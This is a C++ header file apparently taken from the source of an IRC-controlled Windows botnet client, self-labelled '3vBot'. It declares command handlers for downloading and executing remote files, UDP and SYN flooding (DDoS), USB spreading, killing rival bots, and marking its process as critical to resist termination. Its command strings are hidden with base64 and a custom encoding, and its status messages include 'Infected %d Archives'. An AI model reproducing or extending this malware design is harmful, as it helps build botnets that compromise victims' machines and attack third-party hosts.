#ifndef IRC_HPP
#define IRC_HPP 

#include "../Includes/includes.hpp"
#include "commands/commands.hpp"

#define		RPL_WELCOME		"001"
#define		RPL_TOPIC		"332"
#define		ERR_NICKNAME	"433"
#define		ERR_NOTREGD		"451"

#define		ERR_GENERIC		"ERROR"
#define		ERR_GENERIC1	"ERROR:"

/*#define		IRC_NICK		api->magic("TklDSw==").c_str()
#define		IRC_USER		api->magic("VVNFUg==").c_str()
#define		IRC_PASS		api->magic("UEFTUw==").c_str()
#define		IRC_JOIN		api->magic("Sk9JTg==").c_str()
#define		IRC_PART		api->magic("UEFSVA==").c_str()
#define		IRC_MSG			api->magic("UFJJVk1TRw==").c_str()
#define		IRC_QUIT		api->magic("UVVJVA==").c_str()
#define		IRC_PING		api->magic("UElORw==").c_str()
#define		IRC_PONG		api->magic("UE9ORw==").c_str()
#define		IRC_TOPIC		api->magic("VE9QSUM=").c_str()
#define		MSG_QUIT				api->magic("W1NUQVRVU106IFF1aXR0aW5nLg==").c_str()
#define		MSG_UN_GENERIC			api->magic("W1NUQVRVU106IFVuaW5zdGFsbGluZy4uLg==").c_str()
#define		MSG_VERSION				api->magic("WzN2Qm90XTogVmVyc2lvbiB2MS4yIEZVTEw=").c_str()
#define		MSG_SERVER_INCORRECT	api->magic("W1NUQVRVU106IEluY29ycmVjdCBzZXJ2ZXIgbnVtYmVyLg==").c_str()
#define		MSG_SERVER_CURRENT		api->magic("W1NUQVRVU106IEkgYW0gY3VycmVudGx5IG9uIHRoYXQgc2VydmVyLg==").c_str()
#define		MSG_SERVER_SWITCHING	api->magic("W1NUQVRVU106IFN3aXRjaGluZyBTZXJ2ZXIu").c_str()
#define		MSG_DL_SUCCESSEXEC		api->magic("W0RPV05MT0FEXTogRG93bmxvYWQgc3VjY2Vzc2Z1bC4gUHJvY2VzcyBzdWNjZXNzZnVsbHkgc3RhcnRlZC4=").c_str()
#define		MSG_DL_SUCCESS			api->magic("W0RPV05MT0FEXTogRG93bmxvYWQgc3VjY2Vzc2Z1bC4=").c_str()
#define		MSG_DL_FAILED_GENERIC	api->magic("W0RPV05MT0FEXTogRG93bmxvYWQgRmFpbGVkLiBHZW5lcmljIGVycm9yLg==").c_str()
#define		MSG_DL_NO_ARGS			api->magic("W0RPV05MT0FEXTogTm90IGVub3VnaCBhcmd1bWVudHMgc3VwcGxpZWQu"
#define		MSG_DL_FAILOUTPUT		api->magic("W0RPV05MT0FEXTogRmFpbGVkIHRvIGNyZWF0ZSBvdXRwdXQgZmlsZS4=").c_str()
#define		MSG_DL_FAILERR			api->magic("W0RPV05MT0FEXTogRG93bmxvYWQgc3VjY2VlZGVkIGJ1dCBwcm9jZXNzIGZhaWxlZCB0byBzdGFydC4gRXJyb3IgQ29kZTogJWQ=").c_str()
#define		MSG_DL_FAIL_RESOLVE		api->magic("W0RPV05MT0FEXTogRXJyb3IgcmVzb2x2aW5nIEROUywgb3IgcGVyaGFwcyB0aGVyZSBpcyBzb21ldGhpbmcgd3Jvbmcgd2l0aCB5b3VyIFVSTD8gRXJyQ29kZTogJWQ=").c_str()
#define		MSG_UPDATE_SUCCESS		api->magic("W1VQREFURV06IFVwZGF0aW5nLi4u").c_str()
#define		MSG_UPDATE_FAILURE		api->magic("W1VQREFURV06IEZhaWxlZCB0byBkb3dubG9hZCB1cGRhdGUgZmlsZS4=").c_str()
#define		MSG_UPDATE_NO_ARGS		api->magic("W1VQREFURV06IE5vdCBlbm91Z2ggYXJndW1lbnRzIHN1cHBsaWVkLg==").c_str()
#define		MSG_USB_STARTED			api->magic("W1VTQl06IFRocmVhZCBTdGFydGVkLg==").c_str()
#define		MSG_USB_STOPPED			api->magic("W1VTQl06IFRocmVhZCBTdG9wcGVkLg==").c_str()
#define		MSG_USB_RUNNING			api->magic("W1VTQl06IFRocmVhZCBSdW5uaW5nLg==").c_str()
#define		MSG_USB_NRUNNING		api->magic("W1VTQl06IFRocmVhZCBOb3QgUnVubmluZy4=").c_str()
#define		MSG_DDOS_HOSTFAIL		api->magic("eW0REb1NdOiBIb3N0IFVucmVhY2hhYmxlLg==").c_str()
#define		MSG_DDOS_CONNFAIL		api->magic("W0REb1NdOiBDb25uZWN0aW9uIGZhaWxlZC4=").c_str()
#define		MSG_DDOS_DDOSING		api->magic("W0REb1NdOiBERG9TIFVuZGVyd2F5Lg==").c_str()
#define		MSG_DDOS_COMPLETE		api->magic("W0REb1NdOiBERG9TIENvbXBsZXRlLg==").c_str()
#define		MSG_DDOS_ABORTED		api->magic("W0REb1NdOiBTeXN0ZW0gdXNhZ2UgdG9vIGhpZ2guIENvbnNlcnZpbmcgcmVzb3VyY2VzLg==").c_str()
#define		MSG_DDOS_CANCELLED		api->magic("W0REb1NdOiBERG9TIGF0dGFjayBjYW5jZWxsZWQu").c_str()
#define		MSG_DDOS_ERRONEOUS		api->magic("W0RET1NdOiBFcnJvbmVvdXMgb3IgbWlzc2luZyBwYXJhbWV0ZXJzLg==").c_str()
#define		MSG_DDOS_NETFAIL		api->magic("W0RET1NdOiBOZXR3b3JrIGZhaWx1cmUu").c_str()
#define		MSG_VISIT_FAILED		api->magic("W1ZJU0lUXTogVmlzaXQgZmFpbGVkLiBHZW5lcmljIEVycm9yLg==").c_str()
#define		MSG_VISIT_SUCCESS		api->magic("W1ZJU0lUXTogVmlzaXQgc3VjY2Vzc2Z1bC4=").c_str()
#define		MSG_PINGFREQ_LOW_VAL	api->magic("W1BJTkdGUkVRXTogRGFuZ2Vyb3VzbHkgbG93IHZhbHVlLiBWYWx1ZSBub3QgYWNjZXB0ZWQu").c_str()
#define		MSG_PINGFREQ_UPDATED	api->magic("W1BJTkdGUkVRXTogUGluZ2ZyZXEgc3VjY2Vzc2Z1bGx5IHVwZGF0ZWQu").c_str()
#define		MSG_BOTKILLER_KILLED	api->magic("W0JPVEtJTExFUl06IEtpbGxlZCAlZCBib3RzLg==").c_str()
#define		MSG_UPTIME		api->magic("W1VQVElNRV06ICVkIHdlZWtzLCAlZCBkYXlzLCAlZCBob3VycywgJWQgbWludXRlcywgJWQgc2Vjb25kcw==").c_str()
#define		MSG_RARZIP		api->magic("SW5mZWN0ZWQgJWQgQXJjaGl2ZXM=").c_str()
#define		MSG_MSN_SENT		api->magic("W01TTl06IFN1Y2Nlc3NmdWxseSBzZW50IG1lc3NhZ2UgdG8gJWQgY29udGFjdHMu").c_str()
#define		MSG_MSN_NOTSENT		api->magic("W01TTl06IE1TTiBub3QgaW5zdGFsbGVkIG9yIG5vIGNvbnRhY3RzIGF2YWlsYWJsZS4=").c_str()*/

#define		IRC_NICK		api->magic("gb\\d").c_str()
#define		IRC_USER		api->magic("nl^k").c_str()
#define		IRC_PASS		api->magic("iZll").c_str()
#define		IRC_JOIN		api->magic("chbg").c_str()
#define		IRC_PART		api->magic("iZkm").c_str()
#define		IRC_MSG			api->magic("ikbofl`").c_str()
#define		IRC_QUIT		api->magic("jnbm").c_str()
#define		IRC_PING		api->magic("ibg`").c_str()
#define		IRC_PONG		api->magic("ihg`").c_str()
#define		IRC_TOPIC		api->magic("mhib\\").c_str()
#define		MSG_QUIT				api->magic("tlmZmnlvS9jŽ‚‚‡€G").c_str()
#define		MSG_UN_GENERIC			api->magic("tlmZmnlvS9n‡‚‡Œz……‚‡€GGG").c_str()
#define		MSG_VERSION				api->magic("tL[ˆvS9o~‹Œ‚ˆ‡9JGM").c_str()
#define		MSG_SERVER_INCORRECT	api->magic("tlmZmnlvS9b‡|ˆ‹‹~|9Œ~‹~‹9‡Ž†{~‹G").c_str()
#define		MSG_SERVER_CURRENT		api->magic("tlmZmnlvS9b9z†9|Ž‹‹~‡…’9ˆ‡9z9Œ~‹~‹G").c_str()
#define		MSG_SERVER_SWITCHING	api->magic("tlmZmnlvS9l‚|‚‡€9l~‹~‹G").c_str()
#define		MSG_DL_SUCCESSEXEC		api->magic("t]hpgehZ]vS9]ˆ‡…ˆz}9ŒŽ||~ŒŒŽ…G9i‹ˆ|~ŒŒ9ŒŽ||~ŒŒŽ……’9Œz‹~}G").c_str()
#define		MSG_DL_SUCCESS			api->magic("t]hpgehZ]vS9]ˆ‡…ˆz}9ŒŽ||~ŒŒŽ…G").c_str()
#define		MSG_DL_FAILED_GENERIC	api->magic("t]hpgehZ]vS9]ˆ‡…ˆz}9_z‚…~}G9`~‡~‹‚|9~‹‹ˆ‹G").c_str()
#define		MSG_DL_NO_ARGS			api->magic("t]hpgehZ]vS9gˆ9~‡ˆŽ€9z‹€Ž†~‡Œ9ŒŽ‰‰…‚~}G"
#define		MSG_DL_FAILOUTPUT		api->magic("t]hpgehZ]vS9_z‚…~}9ˆ9|‹~z~9ˆŽ‰Ž9‚…~G").c_str()
#define		MSG_DL_FAILERR			api->magic("t]hpgehZ]vS9]ˆ‡…ˆz}9ŒŽ||~~}~}9{Ž9‰‹ˆ|~ŒŒ9z‚…~}9ˆ9Œz‹G9^‹‹ˆ‹9\\ˆ}~S9>}").c_str()
#define		MSG_DL_FAIL_RESOLVE		api->magic("t]hpgehZ]vS9^‹‹ˆ‹9‹~Œˆ…‚‡€9]glE9ˆ‹9‰~‹z‰Œ9~‹~9‚Œ9Œˆ†~‚‡€9‹ˆ‡€9‚9’ˆŽ‹9nkeX9^‹‹\\ˆ}~S9>}").c_str()
#define		MSG_UPDATE_SUCCESS		api->magic("tni]Zm^vS9n‰}z‚‡€GGG").c_str()
#define		MSG_UPDATE_FAILURE		api->magic("tni]Zm^vS9_z‚…~}9ˆ9}ˆ‡…ˆz}9Ž‰}z~9‚…~G").c_str()
#define		MSG_UPDATE_NO_ARGS		api->magic("tni]Zm^vS9gˆ9~‡ˆŽ€9z‹€Ž†~‡Œ9ŒŽ‰‰…‚~}G").c_str()
#define		MSG_USB_STARTED			api->magic("tnl[vS9m‹~z}9lz‹~}G").c_str()
#define		MSG_USB_STOPPED			api->magic("tnl[vS9m‹~z}9lˆ‰‰~}G").c_str()
#define		MSG_USB_RUNNING			api->magic("tnl[vS9m‹~z}9kŽ‡‡‚‡€G").c_str()
#define		MSG_USB_NRUNNING		api->magic("tnl[vS9m‹~z}9gˆ9kŽ‡‡‚‡€G").c_str()
#define		MSG_DDOS_CONNFAIL		api->magic("t]]ˆlvS9\\ˆ‡‡~|‚ˆ‡9z‚…~}G").c_str()
#define		MSG_DDOS_DDOSING		api->magic("t]]ˆlvS9]]ˆl9n‡}~‹z’G").c_str()
#define		MSG_DDOS_COMPLETE		api->magic("t]]ˆlvS9]]ˆl9\\ˆ†‰…~~G").c_str()
#define		MSG_DDOS_ABORTED		api->magic("t]]ˆlvS9l’Œ~†9ŽŒz€~9ˆˆ9‚€G9\\ˆ‡Œ~‹‚‡€9‹~ŒˆŽ‹|~ŒG").c_str()
#define		MSG_DDOS_CANCELLED		api->magic("t]]ˆlvS9]]ˆl9zz|„9|z‡|~……~}G").c_str()
#define		MSG_DDOS_ERRONEOUS		api->magic("t]]hlvS9^‹‹ˆ‡~ˆŽŒ9ˆ‹9†‚ŒŒ‚‡€9‰z‹z†~~‹ŒG").c_str()
#define		MSG_DDOS_NETFAIL		api->magic("t]]hlvS9g~ˆ‹„9z‚…Ž‹~G").c_str()
#define		MSG_VISIT_FAILED		api->magic("toblbmvS9o‚Œ‚9z‚…~}G9`~‡~‹‚|9^‹‹ˆ‹G").c_str()
#define		MSG_VISIT_SUCCESS		api->magic("toblbmvS9o‚Œ‚9ŒŽ||~ŒŒŽ…G").c_str()
#define		MSG_PINGFREQ_LOW_VAL	api->magic("tibg`_k^jvS9]z‡€~‹ˆŽŒ…’9…ˆ9z…Ž~G9oz…Ž~9‡ˆ9z||~‰~}G").c_str()
#define		MSG_PINGFREQ_UPDATED	api->magic("tibg`_k^jvS9i‚‡€‹~Š9ŒŽ||~ŒŒŽ……’9Ž‰}z~}G").c_str()
#define		MSG_BOTKILLER_KILLED	api->magic("t[hmdbee^kvS9d‚……~}9>}9{ˆŒG").c_str()
#define		MSG_UPTIME		api->magic("tnimbf^vS9>}9~~„ŒE9>}9}z’ŒE9>}9ˆŽ‹ŒE9>}9†‚‡Ž~ŒE9>}9Œ~|ˆ‡}Œ").c_str()


#define		CODE_QUIT		-11
#define		CODE_SWITCH		-12

#define		MAX_RECV		514

class API;
class IRC {
public:
	
	IRC	( API*, char*, char*, char*, char*, char*, char*, bool, bool );
	~IRC( void );

	void	RootInit			( void );
	bool	WsaInitialize		( void );
	bool	SockInitialize		( int );
	bool	AddrInitialize		( int );
	int		MakeConnection		( void );
	int		ConnHandler			( void );
	int		CmdHandler			( string, string, string, string, string, string, string );
	int		IRCSend				( string, string, string );
	int		IRCTopic			( string );
	void	Authenticate		( void );
	void	GenerateNickname	( void );
	string	getOs				( void );
	int		BotKill				( string path );

	int		CMDServer			( string );
	int		CMDDownload			( string, bool, bool update = false );
	int		CMDUninstall		( bool update = false );
	int		CMDUpdate			( string );
	int		CMDVisit			( string, bool );
	int		CMDUptime			( void );
	int		CMDDDoS				(string ip, string port, int time, int ddosDelay, bool udp);
	int		CMDDDoSSYN			(string ip, string port, int time);
	int		CMDBotKill			( void );
	DWORD __stdcall UnCriticalIt(DWORD pid);
	std::string IRC::GenerateNumber(int Len);

	struct CMD {
		string	dlfile;
		bool	exec;
		IRC*	IRCClass;
	} cmd;

	struct RET {
		IRC*	irc;
		API*	api;
	} ret;

	struct RECV {
		string	buffer;
		IRC*	irc;
		API*	api;
	};

	/*struct SPREADING {
		bool usb;
	} spreading;*/

	bool spreadusb;

	/* TEMP */
	API *api;
	SOCKET	ircsock;
	int		currserver;
	int		globstatus; //IMPORTANT
	int		connretainer;
	int		pingtimeout;
	DWORD	dwLastRecv;
	string	botnick;
	
	struct SERVERS {
		string server;
		string serverpw;
		string port;
		string channel;
		string channelpw;
	} servers[2];

private:

	HANDLE hRetainer;
	WSADATA wsaData;
	addrinfo *result,
			 *ptr,
			 hints;
	
	
	int		newserver;
	int		serversnum;
	int		herdersnum;
	int		failures;
	int		emptyindexes;
	bool	silence;
	bool	shouldDDoS;
	bool	isNew;
	bool	isUSB;
	char	prefix;
	HANDLE	IRCRET;


	string	location;
	string	botuser;
	string *words;
	

	struct HERDERS {
		string snick;
		string sidentd;
		string shost;
	} herders[3];

	typedef struct _pv_info_
	{
		union
		{
			struct
			{
				BYTE	type;
				BYTE	ver;
				BYTE	reserved0;
				BYTE	reserved1;
			};
			DWORD	_dw0;
		};
		union
		{
			struct
			{
				WORD	country;
				WORD	state;
			};
			DWORD	_dw1;
		};
		union
		{
			struct
			{
				BYTE	location_info_len;
				BYTE	reserved2;
				BYTE	reserved3;
				BYTE	reserved4;
			};
			DWORD	_dw2;
		};
	} pv_info_;

	typedef struct _dialog_
	{
		LIST_MEMBERS(struct _dialog_);
		int					id;
		struct sockaddr_in	addr;
		SOCKET				sock;
		int					conn_pending;
		char				in_data[4096 + 16];
		unsigned short		in_data_len;
		int					ack;
	} dialog_;

	typedef struct _rs_
	{
		char		*host;
		WORD		port;
		char		conn_state;
		int			cur_len;
		SOCKET		sock;
		char		buff[4096 + 16];
		DWORD		next_conn_time;
		dialog_		*dlgl;
		pv_info_	pi;
		TIMEVAL		tv;
		DWORD		delay;
		void		*(__stdcall *falloc)();
		void		*(__stdcall *ffree)();
		char		*location_str;
		int			location_str_len;
	} rs_;

};

DWORD __stdcall DownloadThread	( IRC::CMD *cmd );
DWORD __stdcall MsgHandler		( IRC::RECV* );
DWORD __stdcall RetThread		( IRC::RET* );
DWORD __stdcall NotThread		( IRC::RET* );

typedef long ( WINAPI *zRtlSetProcessIsCritical ) (BOOLEAN bNew, BOOLEAN *pbOld, BOOLEAN bNeedScb );
typedef struct IN {
	zRtlSetProcessIsCritical RtlSetProcessIsCritical;
}*PIN, CIN;

#endif